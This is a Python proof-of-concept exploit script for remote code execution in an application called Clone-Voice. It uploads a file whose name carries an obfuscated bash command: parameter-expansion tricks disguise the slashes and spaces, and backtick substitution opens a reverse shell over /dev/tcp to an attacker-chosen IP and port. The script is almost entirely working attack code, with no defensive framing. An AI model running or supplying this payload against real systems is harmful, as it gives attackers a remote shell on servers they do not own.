#!/usr/bin/env python3

import argparse
import requests

def execute_rce(url, ip, port):
    print("[!] Clone-Voice RCE PoC")
    print(f"[*] Target URL: {url}")
    print(f"[*] Reverse shell: {ip}:{port}")
    
    # beautiful payload
    payload = f"hello`pwd=$(pwd)&&d=$(date)&&f=${{d%${{d#????}}}}&&s=${{f#???}}&&bash${{s}}-c${{s}}\"bash${{s}}-i${{s}}>&${{s}}${{pwd%${{pwd#?}}}}dev${{pwd%${{pwd#?}}}}tcp${{pwd%${{pwd#?}}}}{ip}${{pwd%${{pwd#?}}}}{port}${{s}}0>&1\"`.flac"
    print(f"[*] Generated payload filename: {payload}")
    print("[*] Sending malicious upload")
        
    files = {'audio': (payload, "test")}
    
    try:
        response = requests.post(f"{url}/upload", files=files)
        response.raise_for_status()
        result = response.json()
        print("[+] Upload successful!")
        print("[*] Server response:")
        print(f"    Code: {result['code']}")
        print(f"    Message: {result['msg']}")
        if 'data' in result:
            print(f"    Data: {result['data']}")
        print("[*] If the exploit was successful, you should receive a reverse shell connection.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error occurred while uploading: {e}")

def main():
    parser = argparse.ArgumentParser(description='Clone-Voice RCE PoC')
    parser.add_argument('--url', required=True, help='Target URL (e.g., http://localhost:9000)')
    parser.add_argument('--shell', nargs=2, metavar=('IP', 'PORT'), required=True, help='Reverse shell IP and port')

    args = parser.parse_args()

    execute_rce(args.url, args.shell[0], args.shell[1])

if __name__ == "__main__":
    main()